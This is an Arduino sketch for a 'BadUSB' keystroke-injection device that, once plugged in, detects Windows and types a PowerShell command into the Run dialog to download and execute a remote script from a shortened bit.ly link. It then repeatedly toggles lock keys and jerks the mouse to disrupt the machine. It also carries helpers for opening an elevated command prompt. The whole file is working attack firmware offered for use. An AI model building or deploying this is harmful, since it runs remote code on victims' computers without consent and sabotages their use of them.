//  +-+-+-+-+-+-+-+-+-+-+
//  |L|y|n|-|B|a|D|u|S|b|
//  +-+-+-+-+-+-+-+-+-+-+

#include <Keyboard.h>
#include <Mouse.h>
#include "FingerprintUSBHost.h"


const int _delay = 45; 
const int _initialdelay = 10000;
const int _loopWait = 120000;

////////////////////
////SETUP
void setup()
{

  //INITIATE KEYBOARD
      Keyboard.begin();
  //WAIT AFTER KEY INSERTED, BEFORE FIRE
      delay(_initialdelay);
}

////////////////////
////MAIN FUNCTION
void BaDuSb()
{
  //GET OS IDENTITY
  String os;
  FingerprintUSBHost.guessHostOS(os);
  
  if(os == "Windows") 
  {
     //ROLL'EM
        RICKROLL();
  }

  //HAVOC
    int x = 0;   //COUNTER 
    int d = 250; //(d)elay; 
    int t = 2;   //MINUTES TO RUN  
    
    do 
    { 
      //HOLD SHIFT+ESC
        Press("CAPSLOCK");delay(_delay); Keyboard.releaseAll();   Press("NUMLOCK"); delay(_delay);Keyboard.releaseAll();   Press("SCROLLLOCK"); delay(_delay); Keyboard.releaseAll();   
      //Increment X by (d)elay;
      x = x+d;
      //MICK-THE-MOUSE
      Mouse.move(random(5, 5000), random(5, 5000), 0); 
      //WAIT
      delay(d);
      //Release Keys
     Keyboard.releaseAll();  
    } 
    while (x < 120000);     
}
////WORKER LOOP
void loop()
{
   //START
       BaDuSb();

       
   //WAIT, DO AGAIN
       delay(_loopWait);   
}


////////////////////
//COMBINATIONS
void RUNCOMMAND() { Press("GUI");  Press("r");   delay(_delay*10);   Keyboard.releaseAll(); }
void OPENAPP(String _app) {  RUNCOMMAND();  delay(_delay * 2);  Keyboard.print(_app); delay(_delay); Press("ENTER");  Keyboard.releaseAll(); }
void CMD() { OPENAPP("CMD"); Press("CTRL"); Press("SHIFT"); Press("ENTER"); Keyboard.releaseAll();}
void NOTEPAD() { OPENAPP("NOTEPAD"); }
void POWERSHELL() { OPENAPP("POWERSHELL"); }

////OBNOXIOUS ALERT
void RICKROLL() { RUNCOMMAND(); delay(_delay* 3); Keyboard.print("powershell.exe -Command ""iex (New-Object Net.WebClient).DownloadString('http://bit.ly/e0Mw9w')""");  delay(_delay); Press("ENTER");  Keyboard.releaseAll();  }
//From http://www.leeholmes.com/

////////////////////
//SHORTCUTS
//For Convienance 
void Press(String b){
  if(b.length() == 1) Keyboard.press(char(b[0]));
  else if (b.equals("ENTER")) Keyboard.press(KEY_RETURN);
  else if (b.equals("CTRL")) Keyboard.press(KEY_LEFT_CTRL);
  else if (b.equals("SHIFT")) Keyboard.press(KEY_LEFT_SHIFT);
  else if (b.equals("ALT")) Keyboard.press(KEY_LEFT_ALT);
  else if (b.equals("GUI") || b.equals("START")) Keyboard.press(KEY_LEFT_GUI);
  else if (b.equals("UP") || b.equals("UPARROW")) Keyboard.press(KEY_UP_ARROW);
  else if (b.equals("DOWN") || b.equals("DOWNARROW")) Keyboard.press(KEY_DOWN_ARROW);
  else if (b.equals("LEFT") || b.equals("LEFTARROW")) Keyboard.press(KEY_LEFT_ARROW);
  else if (b.equals("RIGHT") || b.equals("RIGHTARROW")) Keyboard.press(KEY_RIGHT_ARROW);
  else if (b.equals("DELETE")) Keyboard.press(KEY_DELETE);
  else if (b.equals("PAGEUP")) Keyboard.press(KEY_PAGE_UP);
  else if (b.equals("PAGEDOWN")) Keyboard.press(KEY_PAGE_DOWN);
  else if (b.equals("HOME")) Keyboard.press(KEY_HOME);
  else if (b.equals("ESC")) Keyboard.press(KEY_ESC);
  else if (b.equals("BACKSPACE")) Keyboard.press(KEY_BACKSPACE);
  else if (b.equals("INSERT")) Keyboard.press(KEY_INSERT);
  else if (b.equals("TAB")) Keyboard.press(KEY_TAB);
  else if (b.equals("END")) Keyboard.press(KEY_END);
  else if (b.equals("CAPSLOCK")) Keyboard.press(KEY_CAPS_LOCK);
  else if (b.equals("NUMLOCK")) Keyboard.press(219);
  else if (b.equals("SCROLLLOCK")) Keyboard.press(207);    
  else if (b.equals("F1")) Keyboard.press(KEY_F1);
  else if (b.equals("F2")) Keyboard.press(KEY_F2);
  else if (b.equals("F3")) Keyboard.press(KEY_F3);
  else if (b.equals("F4")) Keyboard.press(KEY_F4);
  else if (b.equals("F5")) Keyboard.press(KEY_F5);
  else if (b.equals("F6")) Keyboard.press(KEY_F6);
  else if (b.equals("F7")) Keyboard.press(KEY_F7);
  else if (b.equals("F8")) Keyboard.press(KEY_F8);
  else if (b.equals("F9")) Keyboard.press(KEY_F9);
  else if (b.equals("F10")) Keyboard.press(KEY_F10);
  else if (b.equals("F11")) Keyboard.press(KEY_F11);
  else if (b.equals("F12")) Keyboard.press(KEY_F12);
  else if (b.equals("NUM_0")) Keyboard.press(234);
  else if (b.equals("NUM_1")) Keyboard.press(225);
  else if (b.equals("NUM_2")) Keyboard.press(226);
  else if (b.equals("NUM_3")) Keyboard.press(227);
  else if (b.equals("NUM_4")) Keyboard.press(228);
  else if (b.equals("NUM_5")) Keyboard.press(229);
  else if (b.equals("NUM_6")) Keyboard.press(230);
  else if (b.equals("NUM_7")) Keyboard.press(231);
  else if (b.equals("NUM_8")) Keyboard.press(232);
  else if (b.equals("NUM_9")) Keyboard.press(233);
  else if (b.equals("CZ_0")) Keyboard.press(41);//////// Czech layout is different
  else if (b.equals("CZ_1")) Keyboard.press(33);
  else if (b.equals("CZ_2")) Keyboard.press(64);
  else if (b.equals("CZ_3")) Keyboard.press(35);
  else if (b.equals("CZ_4")) Keyboard.press(36);
  else if (b.equals("CZ_5")) Keyboard.press(37);
  else if (b.equals("CZ_6")) Keyboard.press(94);
  else if (b.equals("CZ_7")) Keyboard.press(38);
  else if (b.equals("CZ_8")) Keyboard.press(42);
  else if (b.equals("CZ_9")) Keyboard.press(40);
  else if (b.equals("ASTERIX") || b.equals("HVEZDICKA")) Keyboard.press(221);
  else if (b.equals("MINUS")) Keyboard.press(222);
  else if (b.equals("PLUS")) Keyboard.press(223);
  else if (b.equals("SLASH")) Keyboard.press(220);
  else if (b.equals("SPACE")) Keyboard.press(' ');
  else if (b.equals("PRINTSCREEN")) Keyboard.press(206);
  // Mouse support
  else if (b.equals("CLICK") || b.equals("CLICK_LEFT")|| b.equals("MOUSE_CLICK_LEFT")|| b.equals("MOUSE_CLICK")) Mouse.click();
  else if (b.equals("CLICK_RIGHT") || b.equals("MOUSE_CLICK_RIGHT")) Mouse.click(MOUSE_RIGHT);
  else if (b.equals("CLICK_MIDDLE") || b.equals("MOUSE_CLICK_MIDDLE")) Mouse.click(MOUSE_MIDDLE);
  
  else if (b.equals("PRESS") || b.equals("PRESS_LEFT") || b.equals("MOUSE_PRESS_LEFT")) Mouse.press();
  else if (b.equals("PRESS_RIGHT") || b.equals("MOUSE_PRESS_RIGHT")) Mouse.press(MOUSE_RIGHT);
  else if (b.equals("PRESS_MIDDLE") || b.equals("MOUSE_PRESS_MIDDLE")) Mouse.press(MOUSE_MIDDLE);
  
  else if (b.equals("RELEASE") || b.equals("RELEASE_LEFT") || b.equals("MOUSE_RELEASE_LEFT") || b.equals("MOUSE_RELEASE")) Mouse.release();
  else if (b.equals("RELEASE_RIGHT") || b.equals("MOUSE_RELEASE_RIGHT")) Mouse.release(MOUSE_RIGHT);
  else if (b.equals("RELEASE_MIDDLE") || b.equals("MOUSE_RELEASE_MIDDLE")) Mouse.release(MOUSE_MIDDLE);
  //else Serial.println("not found :'"+b+"'("+String(b.length())+")");
}

///////////////////
